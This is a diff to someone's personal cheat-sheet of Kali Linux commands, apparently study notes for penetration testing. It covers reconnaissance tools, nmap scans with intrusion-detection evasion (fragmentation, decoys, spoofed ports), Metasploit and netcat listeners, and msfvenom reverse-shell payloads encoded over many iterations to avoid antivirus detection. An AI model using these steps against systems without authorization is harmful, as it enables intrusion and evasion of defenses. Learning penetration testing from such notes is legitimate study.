@@ -1,8 +1,10 @@
 cd: Change directory
 ls: list of items in the file
+ls -la: show all files including hidden files
 pwd: location of your current directory
 touch (file name): creates new file
-cat (file name): displays contents of the file          
+cat (file name): displays contents of the file 
+cd ..: go to previous directory         
 echo (text to add in the file) > (file name): Adds content in the file
 nano (file name): opens nano editor to create and edit text files
 python3 (file name.py): run a python program
@@ -12,6 +14,7 @@ cp (name of file to be copied) (new name of the file in which it is to be pasted
 rm (file name): delete a file permanently
 rm (directory name) -r: delete a directory
 cp (/home/encode/...entire directory.../new file name): copy a file and paste into another directory
+sudo dpkg -i (name of the software to install): install a software from terminal
 
 
 sudo ifconfig: ip address
@@ -24,12 +27,63 @@ whois (website name): gather info about website
 whatweb (website name/ip address): scan website
 whatweb --help: info about whatweb and its plugins
 whatweb (ip address starting range [Eg: 192.168.1.1])-(ip address ending range [Eg: 192.168.1.255]) --aggression (aggression level 1 to 3) -v : Scans for the connections in that ip address range
-theHarvester -d (domain name) -b (source eg: google/yahoo/all): gather emails of a specific website
+theHarvester -d (domain name) -b (source [eg: google/yahoo/all]): gather emails of a specific website
 (google search) hunter.io: Alternative for theHarvester if it doesn't work
 git clone (link of the github file): download any file from github
 python3 sherlock.py (username to be searched): searches for the username in all the websites
 
 sudo arp --help: arp tool is used to scan your network
 sudo arp -a: to scan a network and number of hosts in it 
-sudo netdiscover: scans for devices connected to your network (same as arp tool but better than that)
-netstat: to check router ip address
+sudo netdiscover: scans for devices connected to your network / locates all the hosts that are up and running in the network(same as arp tool but better than that)
+netstat -nr: to check router ip address
+
+nmap (ip address): scans for open ports in the hosts connected to the ip network
+sudo nmap -sS (ip address): TCP syn scan, i.e it just performs the first step of 3 way handshake in TCP i.e sending syn and not acknowledging further
+nmap -sT (ip address): TCP connect scan, i.e it performs all the 3 way handshake process 
+man nmap: nmap manual which has all the details about nmap tools and other details
+nmap -O (ip address): detect the OS running on the machine (it should have 1 open port and 1 close port)
+sudo nmap -sV (ip address): service version scan, it scans the service versions running on the device
+sudo nmap -sV --version intensity (0 to 9) (ip address): it gives more accuracy in software version of the service, default intensity is 7 if we don't mention the intensity, so for higher accuracy go for 8 or 9 intensity (it requires more time than the default scan)
+sudo nmap -A (ip address): it is an aggressive scan, detects OS, version of the service and nmap script scanning, it has high noise level
+nmap -sn (ip address): same as netdiscover, it used to locate all the hosts that are up and running in the network
+nmap -p (port number [Eg: 80] or [Eg: 80,22,100] or [Eg: 1-100]) (ip address): scans for a specific ports in the machine (you can scan for multiple ports as well by mentioning)
+nmap -F (ip address): to scan top100 ports i.e top 100 ports which are most used
+sudo nmap -(any command [Eg: sS]) (ip address) >> (name of file Eg: outputofscan.txt): to output the result of the scan in a file
+sudo nmap -oN (file name [Eg: output]) -(any command [Eg: sS]) (ip address): to output the result of the scan in both file as well as terminal
+sudo nmap -sF (ip address): fin scan, just sends a fin flag without sending any other packets
+
+sudo nmap -f (ip address):requested scan to use tiny fragmented ip packets (it splits the packets in 8 bytes or less by adding single ' -f ') (it will split the packet in 16 byte if ' -f -f ' is added) (it is not supported by some of the programs so not used widely)
+sudo nmap -mtu (offset size [Eg; 32]) (ip address): set your own offset size
+sudo nmap -D RND:(number of ip address you wanna use [Eg; 5]) (ip address): creates decoy, i.e Send scans from spoofed IPs (target's intrusion detection system might report multiple ip address including yours) (use this for global network)
+sudo nmap -D (any ip address) (any ip address) (any ip address) ME(your own ip address): send scans from the all the spoofed ip address you mentioned including yours (use this for a local network)
+sudo nmap -g (port number [Eg: 53]) (ip address):Use given source port number
+nmap -(T1 to T5) (ip address): timing options that allows how aggressively you want to scan 
+
+cd /usr/share/nmap/scripts: directory to all the existing nmap scripts
+sudo nmap --script (script group name [Eg: auth]) --(type of scan [Eg: sS]) (ip address): discovers for vulnerabilities in the machine using script group
+sudo nmap --script (script name [Eg: ftp-anon.nse]) (ip address): to make a connection using a single script 
+(ip address):(port number [Eg; 8180]): to make a connection to a certain port of a machine
+sudo nmap --script-help (script name): shows details about the nmap script
+ftp (ip address): to login to ftp of machine if anon-login is allowed
+searchsploit --help: it takes the software version as input and searches for it vulnerabilities in kali linux database
+searchsploit (version name): gives the exploits of that specific version from the existing database
+locate (exploit name): to search where the exploit is located in our machine
+
+msfconsole: opens metaspoitable console
+[in console command] show ([Eg: payload or exploits]): shows all the payloads or exploits whatever you command for
+use (name of exploit or payload or etc): to execute the exploit or payload
+show info: gives information about the exploit or payload you are currently running
+set (parameter name [Eg; LHOST]): change the values of any particular parameter
+set payload (payload name [Eg: payload/windows/shell/bind_tcp]): change the payload to be used
+nc -h: netcat help, it allows to establish a connection to other machines using both tcp and udp 
+sessions -i (id of the session [Eg: 2]): enter any session in msfconsole if the session is opened
+vncviewer (ip address): connects to vnc if there is any vnc vulnerability (password: password)
+nc -lvp (port number): ncat command, to listen to incoming connections (target machine will try to connect to the port specified)
+
+msfvenom -h: msfvenom help menu
+msfvenom -p (machine and type of payload you want to create [Eg: windows/x64/meterpreter/reverse_tcp]) LHOST=(kali ip address) LPORT=(port no. to which target will connect [Eg: 5555]) -f (file type [Eg:exe]) -o (name of the file [Eg:shell.exe]): to create a payload in msfvenom
+virustotal (google search): to check your virus can be detected by how many antivirus
+msfvenom --list encoders: list all the encoders available in msfvenom
+msfvenom -p (machine and type of payload you want to create [Eg: windows/x64/meterpreter/reverse_tcp]) LHOST=(kali ip address) LPORT=(port no. to which target will connect [Eg: 5555]) -a (architecture [Eg: x64]) -e (type of encoder [Eg: x64/zutto_dekiru]) -i (number of iterations [Eg: 15]) --platform (target os [Eg: windows]) -n (no. of nopsled [Eg: 500]) -f (file type [Eg:exe]) -o (name of the file [Eg:shell.exe]): to create an advanced payload 
+veil: to open veil shell for generating payloads
+md5sum (file name): to check the hex number of the file
